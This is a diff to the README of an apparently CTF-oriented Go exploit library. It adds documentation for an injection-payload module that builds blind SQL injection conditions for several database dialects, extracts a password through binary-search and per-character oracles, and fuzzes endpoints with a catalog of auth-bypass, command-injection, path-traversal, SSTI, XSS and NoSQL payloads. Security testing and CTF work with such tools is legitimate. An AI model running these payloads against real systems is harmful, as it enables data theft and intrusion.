@@ -76,7 +76,7 @@ Everything you need for the common case is re-exported from a single root packag
 ```go
 import . "github.com/tonythetender/pwngears"
 ```
-This gives you the whole dependency-free core (binary exploitation, web, cryptography and bruteforcing) under one namespace. The root package pulls in no third-party code, so an exploit built on it compiles to a lean static binary.
+This gives you the whole dependency-free core (binary exploitation, web, cryptography, bruteforcing and injection payloads) under one namespace. The root package pulls in no third-party code, so an exploit built on it compiles to a lean static binary.
 
 If you prefer a more focused namespace, you can still import the individual subpackages directly.
 ```go
@@ -436,6 +436,55 @@ password, _ := bf.TimingAttack("", func(guess string) time.Duration {
 	conn.Get("/item", WithParam("id", payload))
 	return time.Since(start)
 }, 3*time.Second)
+```
+
+### Injection payloads
+Writing injection strings by hand is fiddly and backend-specific. The `payloads` helpers (re-exported at the root) build them for you.
+
+For blind extraction, `SQLi` describes *what* you want to read once and generates the per-position conditions in the right dialect, so you never hand-write `SUBSTRING` / `SUBSTR` / `ASCII` / `UNICODE` / `LENGTH` / `LEN` and never pick the wrong one.
+```go
+q := SQLi{Dialect: MySQL, Expr: "password", From: "users", Where: "id=1"}
+
+q.Greater(pos, value)   // ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),pos,1))>value
+q.Equal(pos, 'a')       // SUBSTRING((...),pos,1)='a'
+q.LengthGreater(10)     // LENGTH((...))>10
+```
+Available dialects are `MySQL`, `Postgres`, `SQLite`, `MSSQL` and `OracleDB`. `Expr` can be any sub-expression (a column, `@@version`, `database()`, a full subquery), while `From` and `Where` are optional. Set `Prefix`/`Suffix` to glue in your injection context once instead of on every call.
+```go
+q := SQLi{Dialect: MySQL, Expr: "password", From: "users",
+	Prefix: "1 AND ", Suffix: MySQL.Comment()}
+
+q.Greater(pos, value)   // 1 AND ASCII(SUBSTRING(...))>value--
+```
+That drops straight into the binary-search extraction shown above:
+```go
+greater := GreaterOracle(
+	func(pos, value int) *Response {
+		return conn.Get("/item", WithParam("id", q.Greater(pos, value)))
+	},
+	func(r *Response) bool { return r.Contains("found") },
+)
+password, _ := bf.BinarySearch(greater)
+```
+If the target filters `>`/`<`, or the value uses a small known alphabet, scan with `Equal` instead. `CharOracle` builds the test and `Scan` drives it: it tries the bruteforcer's charset at each position and stops at the end of the string, exactly like `BinarySearch` does, just one candidate at a time rather than halving a range. In short, `Greater` pairs with `BinarySearch`, `Equal` pairs with `Scan`.
+```go
+scan := CharOracle(
+	func(pos int, c byte) *Response {
+		return conn.Get("/item", WithParam("id", q.Equal(pos, c)))
+	},
+	func(r *Response) bool { return r.Contains("found") },
+)
+
+bf.Charset = GenerateCharset("lowercase", "digits")
+password, _ := bf.Scan(scan)
+```
+When you just want to throw a list of known vectors at an endpoint, the catalog returns ready-made payloads that feed `Fuzz` directly. For SQL there is `AuthBypass()`, `UnionNull(n)`, `OrderBy(n)` and `TimeDelay(dialect, seconds)`; for other classes there is `CmdInjection()`, `PathTraversal()`, `SSTI()`, `XSS()` and `NoSQL()`.
+```go
+hits := Fuzz(
+	func(p string) *Response { return conn.Get("/render", WithParam("name", p)) },
+	SSTI(),
+	MatchRegex("49"),   // the template engine evaluated {{7*7}}
+)
 ```
 
 ### Binary Exploitation
